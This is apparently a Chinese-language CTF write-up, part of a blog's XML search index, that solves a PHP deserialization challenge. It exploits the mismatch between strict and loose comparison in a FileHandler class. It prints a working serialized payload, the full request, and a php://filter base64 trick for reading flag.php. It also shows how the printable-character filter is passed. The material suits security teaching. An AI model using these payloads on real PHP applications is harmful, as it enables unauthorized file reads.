0; $i &lt; strlen($s); $i++)        if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125))            return false;    return true;&#125;if(isset($_GET&#123;&#x27;str&#x27;&#125;)) &#123;    $str = (string)$_GET[&#x27;str&#x27;];    if(is_valid($str)) &#123;        $obj = unserialize($str);    &#125;&#125;?&gt;
+
+漏洞分析核心漏洞：比较运算符不一致这是本题的关键漏洞！代码中存在比较运算符不一致的问题：
+
+__destruct() 使用严格比较：$this-&gt;op === &quot;2&quot;
+process() 使用非严格比较：$this-&gt;op == &quot;2&quot;
+
+漏洞原理在 PHP 中：
+
+严格比较 ===：要求值和类型都相同
+非严格比较 ==：只要求值相同，会进行类型转换
+
+
+
+
+比较表达式
+结果
+原因
+
+
+
+2 === &quot;2&quot;
+false
+类型不同（整数 vs 字符串）
+
+
+2 == &quot;2&quot;
+true
+值相同（都会转换为数字2）
+
+
+利用思路需要构造一个反序列化 payload，使得：
+
+__destruct() 中 $this-&gt;op === &quot;2&quot; 返回 false（不修改 op 值）
+process() 中 $this-&gt;op == &quot;2&quot; 返回 true（执行 read 方法）
+
+Payload 构造方法一：使用整数类型的 opO:11:&quot;FileHandler&quot;:2:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;&#125;
+
+解释：
+
+O:11:&quot;FileHandler&quot;：反序列化为 FileHandler 对象
+s:2:&quot;op&quot;;i:2：设置 op 为整数 2（不是字符串 “2”）
+s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;：设置要读取的文件为 flag.php
+
+方法二：使用公共属性覆盖（无需前缀）由于代码直接访问 $this-&gt;op，我们可以使用公共属性名称，不需要 %00*%00 前缀：
+// 类中定义的是 protected $op// 但我们可以直接使用 &quot;op&quot; 创建公共属性O:11:&quot;FileHandler&quot;:2:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;&#125;
+
+原理：当反序列化时创建公共属性 $op，PHP 会优先访问公共属性。
+完整利用过程1. 发送 Payload?str=O:11:&quot;FileHandler&quot;:2:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;&#125;
+
+2. 执行流程反序列化 → 对象创建 → __destruct() 调用        ↓$this-&gt;op = 2 (整数)        ↓$this-&gt;op === &quot;2&quot; → false (严格比较失败)        ↓$this-&gt;content = &quot;&quot;        ↓process() 调用        ↓$this-&gt;op == &quot;2&quot; → true (非严格比较成功)        ↓read() 执行，读取 flag.php        ↓output() 输出文件内容
+
+3. 获取 Flag
+执行后并没有显示 flag 内容，说明文件没有直接输出flag,而是把flag设置在变量里可以把payload中的filename改为php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php,获得文件的base64编码
+
+
+
+然后解码得到flag
+
+
+技术要点总结1. PHP 反序列化属性访问优先级
+
+
+属性类型
+访问优先级
+序列化格式
+
+
+
+公共属性
+最高
+属性名
+
+
+protected
+次之
+\x00*\x00属性名
+
+
+private
+最低
+\x00类名\x00属性名
+
+
+2. 比较运算符差异// 严格比较（类型+值）$a === $b// 非严格比较（仅值）$a == $b
+
+3. is_valid 函数绕过function is_valid($s) &#123;    for($i = 0; $i &lt; strlen($s); $i++)        if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125))            return false;    return true;&#125;
+
+该函数只检查可打印 ASCII 字符（32-125），我的 payload 完全由可打印字符组成，因此可以顺利通过检查。
+Flagflag&#123;feff0449-1519-4e96-a316-c09b469eb5d6&#125;
+
+总结本题的核心在于比较运算符不一致导致的漏洞。通过巧妙构造反序列化 payload，利用整数和字符串的弱比较特性，成功绕过了 __destruct() 的限制，最终读取了 flag 文件。
+]]></content>
+      <tags>
+        <tag>解题wp</tag>
+        <tag>反序列化</tag>
+      </tags>
+  </entry>
+</search>
